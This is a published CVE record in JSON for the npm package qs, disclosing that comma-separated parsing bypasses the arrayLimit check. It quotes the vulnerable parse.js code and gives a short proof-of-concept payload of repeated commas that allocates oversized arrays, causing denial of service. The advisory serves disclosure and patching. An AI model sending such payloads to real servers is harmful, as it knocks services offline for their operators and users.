{
    "dataType": "CVE_RECORD",
    "dataVersion": "5.2",
    "cveMetadata": {
        "cveId": "CVE-2026-2391",
        "assignerOrgId": "7ffcee3d-2c14-4c3e-b844-86c6a321a158",
        "state": "PUBLISHED",
        "assignerShortName": "harborist",
        "dateReserved": "2026-02-12T03:52:09.332Z",
        "datePublished": "2026-02-12T04:39:42.914Z",
        "dateUpdated": "2026-02-12T04:39:42.914Z"
    },
    "containers": {
        "cna": {
            "affected": [
                {
                    "collectionURL": "https://npmjs.com/qs",
                    "defaultStatus": "unaffected",
                    "packageName": "qs",
                    "repo": "https://github.com/ljharb/qs",
                    "versions": [
                        {
                            "lessThanOrEqual": "6.14.1",
                            "status": "affected",
                            "version": "0",
                            "versionType": "semver"
                        }
                    ]
                }
            ],
            "descriptions": [
                {
                    "lang": "en",
                    "supportingMedia": [
                        {
                            "base64": false,
                            "type": "text/html",
                            "value": "### Summary<br>The `arrayLimit` option in qs does not enforce limits for comma-separated values when `comma: true` is enabled, allowing attackers to cause denial-of-service via memory exhaustion. This is a bypass of the array limit enforcement, similar to the bracket notation bypass addressed in GHSA-6rw7-vpxm-498p (CVE-2025-15284).<br><br>### Details<br>When the `comma` option is set to `true` (not the default, but configurable in applications), qs allows parsing comma-separated strings as arrays (e.g., `?param=a,b,c` becomes `['a', 'b', 'c']`). However, the limit check for `arrayLimit` (default: 20) and the optional throwOnLimitExceeded occur after the comma-handling logic in `parseArrayValue`, enabling a bypass. This permits creation of arbitrarily large arrays from a single parameter, leading to excessive memory allocation.<br><br>**Vulnerable code** (lib/parse.js: lines ~40-50):<br>```js<br>if (val &amp;&amp; typeof val === 'string' &amp;&amp; options.comma &amp;&amp; val.indexOf(',') &gt; -1) {<br>&nbsp; &nbsp; return val.split(',');<br>}<br><br>if (options.throwOnLimitExceeded &amp;&amp; currentArrayLength &gt;= options.arrayLimit) {<br>&nbsp; &nbsp; throw new RangeError('Array limit exceeded. Only ' + options.arrayLimit + ' element' + (options.arrayLimit === 1 ? '' : 's') + ' allowed in an array.');<br>}<br><br>return val;<br>```<br>The `split(',')` returns the array immediately, skipping the subsequent limit check. Downstream merging via `utils.combine` does not prevent allocation, even if it marks overflows for sparse arrays.This discrepancy allows attackers to send a single parameter with millions of commas (e.g., `?param=,,,,,,,,...`), allocating massive arrays in memory without triggering limits. It bypasses the intent of `arrayLimit`, which is enforced correctly for indexed (`a[0]=`) and bracket (`a[]=`) notations (the latter fixed in v6.14.1 per GHSA-6rw7-vpxm-498p).<br><br>### PoC<br>**Test 1 - Basic bypass:**<br>```<br>npm install qs<br>```<br><br>```js<br>const qs = require('qs');<br><br>const payload = 'a=' + ','.repeat(25);  // 26 elements after split (bypasses arrayLimit: 5)<br>const options = { comma: true, arrayLimit: 5, throwOnLimitExceeded: true };<br><br>try {<br>&nbsp; const result = qs.parse(payload, options);<br>&nbsp; console.log(result.a.length);  // Outputs: 26 (bypass successful)<br>} catch (e) {<br>&nbsp; console.log('Limit enforced:', e.message);  // Not thrown<br>}<br>```<br>**Configuration:**<br>- `comma: true`<br>- `arrayLimit: 5`<br>- `throwOnLimitExceeded: true`<br><br>Expected: Throws \"Array limit exceeded\" error.<br>Actual: Parses successfully, creating an array of length 26.<br><br><br>### Impact<br>Denial of Service (DoS) via memory exhaustion.<br>"
                        }
                    ],
                    "value": "### Summary\nThe `arrayLimit` option in qs does not enforce limits for comma-separated values when `comma: true` is enabled, allowing attackers to cause denial-of-service via memory exhaustion. This is a bypass of the array limit enforcement, similar to the bracket notation bypass addressed in GHSA-6rw7-vpxm-498p (CVE-2025-15284).\n\n### Details\nWhen the `comma` option is set to `true` (not the default, but configurable in applications), qs allows parsing comma-separated strings as arrays (e.g., `?param=a,b,c` becomes `['a', 'b', 'c']`). However, the limit check for `arrayLimit` (default: 20) and the optional throwOnLimitExceeded occur after the comma-handling logic in `parseArrayValue`, enabling a bypass. This permits creation of arbitrarily large arrays from a single parameter, leading to excessive memory allocation.\n\n**Vulnerable code** (lib/parse.js: lines ~40-50):\n```js\nif (val && typeof val === 'string' && options.comma && val.indexOf(',') > -1) {\n    return val.split(',');\n}\n\nif (options.throwOnLimitExceeded && currentArrayLength >= options.arrayLimit) {\n    throw new RangeError('Array limit exceeded. Only ' + options.arrayLimit + ' element' + (options.arrayLimit === 1 ? '' : 's') + ' allowed in an array.');\n}\n\nreturn val;\n```\nThe `split(',')` returns the array immediately, skipping the subsequent limit check. Downstream merging via `utils.combine` does not prevent allocation, even if it marks overflows for sparse arrays.This discrepancy allows attackers to send a single parameter with millions of commas (e.g., `?param=,,,,,,,,...`), allocating massive arrays in memory without triggering limits. It bypasses the intent of `arrayLimit`, which is enforced correctly for indexed (`a[0]=`) and bracket (`a[]=`) notations (the latter fixed in v6.14.1 per GHSA-6rw7-vpxm-498p).\n\n### PoC\n**Test 1 - Basic bypass:**\n```\nnpm install qs\n```\n\n```js\nconst qs = require('qs');\n\nconst payload = 'a=' + ','.repeat(25);  // 26 elements after split (bypasses arrayLimit: 5)\nconst options = { comma: true, arrayLimit: 5, throwOnLimitExceeded: true };\n\ntry {\n  const result = qs.parse(payload, options);\n  console.log(result.a.length);  // Outputs: 26 (bypass successful)\n} catch (e) {\n  console.log('Limit enforced:', e.message);  // Not thrown\n}\n```\n**Configuration:**\n- `comma: true`\n- `arrayLimit: 5`\n- `throwOnLimitExceeded: true`\n\nExpected: Throws \"Array limit exceeded\" error.\nActual: Parses successfully, creating an array of length 26.\n\n\n### Impact\nDenial of Service (DoS) via memory exhaustion."
                }
            ],
            "impacts": [
                {
                    "capecId": "CAPEC-130",
                    "descriptions": [
                        {
                            "lang": "en",
                            "value": "CAPEC-130 Excessive Allocation"
                        }
                    ]
                }
            ],
            "metrics": [
                {
                    "cvssV4_0": {
                        "Automatable": "NOT_DEFINED",
                        "Recovery": "NOT_DEFINED",
                        "Safety": "NOT_DEFINED",
                        "attackComplexity": "LOW",
                        "attackRequirements": "PRESENT",
                        "attackVector": "NETWORK",
                        "baseScore": 6.3,
                        "baseSeverity": "MEDIUM",
                        "exploitMaturity": "NOT_DEFINED",
                        "privilegesRequired": "NONE",
                        "providerUrgency": "NOT_DEFINED",
                        "subAvailabilityImpact": "NONE",
                        "subConfidentialityImpact": "NONE",
                        "subIntegrityImpact": "NONE",
                        "userInteraction": "NONE",
                        "valueDensity": "NOT_DEFINED",
                        "vectorString": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
                        "version": "4.0",
                        "vulnAvailabilityImpact": "LOW",
                        "vulnConfidentialityImpact": "NONE",
                        "vulnIntegrityImpact": "NONE",
                        "vulnerabilityResponseEffort": "NOT_DEFINED"
                    },
                    "format": "CVSS",
                    "scenarios": [
                        {
                            "lang": "en",
                            "value": "GENERAL"
                        }
                    ]
                },
                {
                    "cvssV3_1": {
                        "attackComplexity": "HIGH",
                        "attackVector": "NETWORK",
                        "availabilityImpact": "LOW",
                        "baseScore": 3.7,
                        "baseSeverity": "LOW",
                        "confidentialityImpact": "NONE",
                        "integrityImpact": "NONE",
                        "privilegesRequired": "NONE",
                        "scope": "UNCHANGED",
                        "userInteraction": "NONE",
                        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
                        "version": "3.1"
                    },
                    "format": "CVSS",
                    "scenarios": [
                        {
                            "lang": "en",
                            "value": "GENERAL"
                        }
                    ]
                }
            ],
            "problemTypes": [
                {
                    "descriptions": [
                        {
                            "cweId": "CWE-20",
                            "description": "CWE-20 Improper Input Validation",
                            "lang": "en",
                            "type": "CWE"
                        }
                    ]
                }
            ],
            "providerMetadata": {
                "orgId": "7ffcee3d-2c14-4c3e-b844-86c6a321a158",
                "shortName": "harborist",
                "dateUpdated": "2026-02-12T04:39:42.914Z"
            },
            "references": [
                {
                    "tags": [
                        "vendor-advisory"
                    ],
                    "url": "https://github.com/ljharb/qs/security/advisories/GHSA-w7fw-mjwx-w883"
                },
                {
                    "tags": [
                        "patch"
                    ],
                    "url": "https://github.com/ljharb/qs/commit/f6a7abff1f13d644db9b05fe4f2c98ada6bf8482"
                }
            ],
            "source": {
                "discovery": "UNKNOWN"
            },
            "title": "qs's arrayLimit bypass in comma parsing allows denial of service",
            "x_generator": {
                "engine": "Vulnogram 0.5.0"
            }
        }
    }
}